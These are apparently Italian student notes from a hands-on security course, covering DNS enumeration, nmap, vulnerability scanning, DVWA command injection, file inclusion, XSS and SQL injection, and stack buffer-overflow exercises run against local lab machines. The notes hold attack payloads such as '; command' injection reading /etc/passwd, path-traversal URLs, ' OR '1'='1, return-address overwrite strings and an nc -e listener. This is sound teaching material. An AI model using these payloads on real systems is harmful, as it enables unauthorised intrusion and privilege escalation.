# LEZIONE 1: Installazione macchina kali
Ricordati di selezionare il disco preinstallato dalla sezione Hard Disk e di creare lo snapshot

- Avviare lo script targets.sh (crea 3 macchine per attacchi)
- Creare "ubuvuln", l'immagine si trova in owa/..., il prof la metterà sul virtuale
>N.B.
>fai lo snapshot e metti host-only nella seconda scheda di rete

# LEZIONE 2: BruteForce attack

## Enumerazione
L'enumerazione è una fase essenziale nella raccolta di informazioni in ambito di cybersecurity. In particolare, l'enumerazione DNS permette di individuare tutti i server DNS e i record corrispondenti per un determinato target, fornendo informazioni utili su una rete o un dominio.
Alcune tecniche e comandi utili:

- Fornisce una panoramica del tipo dei record
- Utilizzo Comando ```dig```
```sh
dig example.com ANY
dig example.com MX
dig example.com A
```
Il comando dig permette di ottenere dettagli sui record DNS come:
- A (indirizzo IP associato a un dominio)
- MX (server di posta)
- CNAME (alias di un dominio)
- TXT (record testuale, spesso usato per SPF e validazioni)
- ANY (tutti i record disponibili per un dominio)


## base64
È una codifica: invoco con ```echo "testo" | base64``` oppure ```echo "cuhadsgfYAWF=" | base64 -d```

## nslookup
- Ottenere informazioni dal server DNS, come
    - Nome del server ```nslookup -q=ns example.com```
    - Indirizzo IP ```nslookup example.com```
    - Record DNS ```nslookup -q=any example.com```
- Mappatura del nome del dominio o dell’indirizzo IP o qualsiasi altro record DNS specifico
Si trova nei tool cliccando in alto a sinistra sull’icona di Kali

## nmap
- Scansione della rete o della sottorete (utilizza indirizzoip.0/24) ```nmap [-sn: host attivi, -p: porte] [indirizzo IP]```
- Scansione con rilevamento del sistema operativo e dei servizi attivi ```nmap -A [indirizzo IP]``` 


## Creare macchina vulnerabile
1. Crea una nuova macchina ubuntu con, seleziona come hard disk `/opt/owavuln`
2. Poi su settings > adapter2 > host only
3. Avvia la macchina e fai lo snapshot

## Metasploit
Utilizzo di Greenbone Security Assistant (GSA) per la scansione di vulnerabilità
- ```sudo gvm-setup``` → per configurare l’utente
- ```sudo gvm start``` → vai all’IP indicato per esaminare le macchine e scoprire se hanno delle vulnerabilità note

scans > tasks > ne creiamo uno nuovo

- Name
- Target > create new >
  - Name
  - Host: indirizzi separati da ","
  - Port list
  - Alive test: consider alive

# LEZIONE 3: WebSecurity

Lanceremo un server web localizzato sulla porta 80. 
- Inannzitutto controla che non esiste nulla sulla porta 80.
- Clonare pentest lab da github.

```sh
git clone https://github.com/eystsen/pentestlab.git 
cd pentestlab
./pentestlab.sh start dwva # e poi vai all'indirizzo specificato
```

- Avviata la macchina dvwa e collegato ad http all'indirizzo, crea un database, accedivi.
- dvwa security: per impostare la "difficoltà" delle sfide.
## 1. Command injection
> Ricorda: ogni tipo di interazione è un vettore di attacco. 

### Livello facile 
- Eseguiamo il ping di ```127.0.0.1```
- Nota che con il ```; [comando]``` posso eseguire un comando arbitrario 
> ```cat etc/passwd -> mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false```

> ```sudo -l -> dà tutte le funzioni che un utente può eeguire```

### Livello medio
- Nota che con il ```; [comando]``` *non posso più* eseguire un comando arbitrario 
Premi *view source* per vedere il codice sorgente, noto che sostituisce solo **&&** e **;** 
Per eseguire comandi arbitrari basta usare una **PIPELINE**

### Livello difficile
```sh
$substitutions = array(
    '&'  => '',
    ';'  => '',
    '| ' => '', # C'è lo spazio, possiamo eseguire comandi arbitrari
    '-'  => '',
    '$'  => '',
    '('  => '',
    ')'  => '',
    '`'  => '',
    '||' => '',
); 
```

## 2. File inclusion
### Livello facile

- I file venivano cercati con richiesta GET: ```http://127.8.0.1/vulnerabilities/fi/?page=[nome-file]```,
potevo anche mettere un nome file arbitrario

### Livello medio
Faceva il replace di ../ e /.., quindi semplicemente metto tra i file ```/etc/passwd```

### Livello difficile
- Il sito controllava se il nome iniziasse con ```file*```. Perciò abbiamo fatto:
```http://127.8.0.1/vulnerabilities/fi/?page=file;../../../../../../../etc/passwd```

## 3. XSS
### Livello facile
se metto nel payload ```\<script>alert("[TESTO]")</script>``` scaricando il dato, esegue lo script

### Livello medio: utilizzo di BURP
proxy -> open in browser: Avvio l'interceptor delle richieste e intercetta una richiesta http.

Mi accorgo che nell'ultima riga c'è il body della richiesta mandato con POST.

Se vado nel tab **DECODE** posso codificare o decodificare

## 3. SQL Injection

### Livello facile
```sh
id    name
+---+-------+
| 1 | admin | # Select bypassata con l'uso di: ' OR '1' = '1
+---+-------+
```
### Livello medio
> Intercetta, manda al repeater, può rimandare il pacchetto visualizzando la risposta direttamente

- Creo il payload malevolo ```1' OR '1'='1'``` con burpsuite ( facco il DECODE AS > URL  )
- Nel payload, metto il codice decodificato al posto dell'ID 

# LEZIONE 4: Binary exploitation
 
1. Scaricare l'archivio dei file necessari per svolgere gli esercizi estrarlo col comando tar ```xzf pwn_lab.tgz``` e seguire le indicazioni nelle slide.

## Primo esercizio 

```c
#include <stdio.h>
#include <string.h>
char *bash = "/bin/bash";
void vuln(char *src){
        char buf[100];
        strcpy(buf, src);   // ----------- > La copiamo in un     buffer di 100 elementi (2)
                            // DOVE VA A SCRIVERE COPY?
        printf("%s\n", buf);// ------- > La stampiamo (3)
}
int main(int argc, char *argv[]){
        vuln(argv[1]); //-------- > Prendiamo in input una stringa (1)
}
```

Ed eseguire```gcc -o es -fno-stack-protector -m32 -z execstack es.c```
dove
- fno-stack-protector disabilita i canarini
- m32 compila per architettura a 32 bit
- z execstack rende lo stack eseguibile

2. Digita ```gdb ./es``` e fare ```disas main``` per disassemblare

```
   0x000011d6 <+0>:     lea    0x4(%esp),%ecx
   0x000011da <+4>:     and    $0xfffffff0,%esp     
   0x000011dd <+7>:     push   -0x4(%ecx)
   0x000011e0 <+10>:    push   %ebp
   0x000011e1 <+11>:    mov    %esp,%ebp
   0x000011e3 <+13>:    push   %ecx                 
   0x000011e4 <+14>:    sub    $0x4,%esp
   0x000011e7 <+17>:    call   0x1214 <__x86.get_pc_thunk.ax>   # funzione interna
   0x000011ec <+22>:    add    $0x2e08,%eax             # somme, sottrazioni di registri...
   0x000011f1 <+27>:    mov    %ecx,%eax
   0x000011f3 <+29>:    mov    0x4(%eax),%eax
   0x000011f6 <+32>:    add    $0x4,%eax
   0x000011f9 <+35>:    mov    (%eax),%eax          
   0x000011fb <+37>:    sub    $0xc,%esp
   0x000011fe <+40>:    push   %eax
   0x000011ff <+41>:    call   0x119d <vuln>        # procede a fare la "call" a "vuln", quindi è una funzione 
   0x00001204 <+46>:    add    $0x10,%esp           # copia i dati
   0x00001207 <+49>:    mov    $0x0,%eax
   0x0000120c <+54>:    mov    -0x4(%ebp),%ecx
   0x0000120f <+57>:    leave
   0x00001210 <+58>:    lea    -0x4(%ecx),%esp
   0x00001213 <+61>:    ret
```

Digito ```disas vuln```

```
   0x0000119d <+0>:     push   %ebp
   0x0000119e <+1>:     mov    %esp,%ebp
   0x000011a0 <+3>:     push   %ebx
   0x000011a1 <+4>:     sub    $0x74,%esp
   0x000011a4 <+7>:     call   0x10a0 <__x86.get_pc_thunk.bx>
   0x000011a9 <+12>:    add    $0x2e4b,%ebx
   0x000011af <+18>:    sub    $0x8,%esp
   0x000011b2 <+21>:    push   0x8(%ebp)
   0x000011b5 <+24>:    lea    -0x6c(%ebp),%eax
   0x000011b8 <+27>:    push   %eax
   0x000011b9 <+28>:    call   0x1040 <strcpy@plt>     # procede a fare la "call" a scrcpy
   0x000011be <+33>:    add    $0x10,%esp               
   0x000011c1 <+36>:    sub    $0xc,%esp
   0x000011c4 <+39>:    lea    -0x6c(%ebp),%eax
   0x000011c7 <+42>:    push   %eax
   0x000011c8 <+43>:    call   0x1050 <puts@plt>
   0x000011cd <+48>:    add    $0x10,%esp
   0x000011d0 <+51>:    nop
   0x000011d1 <+52>:    mov    -0x4(%ebp),%ebx
   0x000011d4 <+55>:    leave
   0x000011d5 <+56>:    ret

```

Eseguo il programma da gdb con il comando ```run [parametro]```. Esce normalmente. 

> nota, per generare lettere ripetute conviene utilizzare ``` perl -e 'print "A"x150, BBB' ```

Lo passiamo come parametro nella run da GDB

```(gdb) run $(perl -e 'print "A"x150, BBB')```

Risultato

```sh
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()         # Indirizzo fuori dallo spazio dedicato al processo
```

## Secondo esercizio: lab_exercises/writevar

Il main invoca come funzione vulnerabile una funzione che accetta
- puntatore al primo argomento
- alloca un buffer di 100 caratteri
- copia **senza controllare** il parametro dentro al buffer

Eseguendo ```./es $(perl -e 'print "A"x99')``` l'output è

```sh
control must be: 0x42434445 now is 3039
SEC{is_it_the_flag?}
```

Quando lo eseguo con un numero più grande, come ```Ax150```, l'output è  

```sh
control must be: 0x42434445 now is 41414141 # -> Abbiamo sovrascritto il valore della variabile control con 4141414, che in ASCII sarebbe "AAAA"

Program received signal SIGSEGV, Segmentation fault.
0xf7e14156 in ?? () from /lib32/libc.so.6
```

Il buffer ricordiamo che è grande **100**, quindi procedo con ricerca **BINARIA**, dimezzando di volta in volta in buffer fin quando non sovrascrivo dei bit della variabile control.

```con Ax104 ``` , ovvero 104 valori a caso per l'overflow, e posso iniettare un numero che voglio nella variabile control. Mettendo EDCB in cui ascii era quello richiesto, raggiungiamo la funzione 

## Terzo esercizio: lab_exercises/secret_function

- Dobbiamo scoprire l'indirizzo della funzione secret: utilizzo ```info function``` su gdb.
    - Scopro che è ```0x565561ad  secret```
- Dobbiamo scoprire come riscrivere l’indirizzo di ritorno:
    - dopo aver fatto crashare il programma con un input molto grande ```run $(perl -e 'print "A"x16,"BBBB"')```, applico il il comando ```x/200xw $esp``` 
    . L'output sarà

    ```
    0xffffc9cc:     0x5655636b      0xffffc9ec      0xffffccf7      0x00000000
    0xffffc9dc:     0x56556330      0x00000000      0x00000000      0xffffffff
    0xffffc9ec:     0x41414141      0x41414141      0x41414141      0x41414141
    0xffffc9fc:     0x41414141      0x41414141      0x41414141      0x41414141
    0xffffca0c:     0x41414141      0x41414141      0x41414141      0x41414141
    [...]
    ```
    - Mi dà che ```0x42424242 in ?? ()```, ovvero le tre B, sono state scritte da qualche parte
- Sostituisco al posto "BBBB" l' **indirizzo di ritorno** in **little endian** ```$(perl -e 'print "A"x16,"\xad\x61\x55\x56"')```

## Quarto esercizio: lab_exercises/secret_function_remote    

- ```nc -l -p 8000  -e ./es```: Mi metto in ascolto sulla porta 8000 e, tutto ciò che viene messo nello standard input della pora 8000 viene messo nello standard input del processo ./es
- su ```eth1``` della macchina vedo il mio ip host only (192.168.56.6). Mi connetto dalla **macchina host** a ```nc 192.168.56.6 8000```
- Ora provo a scrivere il payload malevolo ```$(perl -e 'print "A"x16,"\xad\x61\x55\x56"')``` dalla macchina host


1. fa partire il comando cat che si mette in ascolto della tastiera e redirezionerà tutto in una shell aperta nel testo

- **comando macchina host**: ```{ perl -e 'print "A"x16, "\xad\x61\x55\x56"'; cat; } | nc 192.168.56.6 8000```

## Quinto esercizio: lab_exercises/shellcode

Assegnamo il binario all'utente root

```sh
sudo chown root:root es
sudo chmod u+s es
```

- Eseguo gdb con sudo, e analizzo facendo ```disas``` sia **main** sia **vuln**

```0x5660a20b <+41>:    call   0x5660a1a9 <vuln>```

- Runno con il codice con elementi casuali (a 112 inizia a sovrascrivere i valori): ```run $(perl -e 'print "A"x112,"BBBB"')```.

- Vedendo i registri con ```x/300xw $esp```, vedo che ci sono le B che ho sovrascritto nei registri. Mi annoto da quale indirizzo in poi le ha sovrascritte.

- Lancio il payload per shellcode.txt
    Esempio:
    ```
    0xffb80bd0:     0x42424141      0x00004242      
    ```



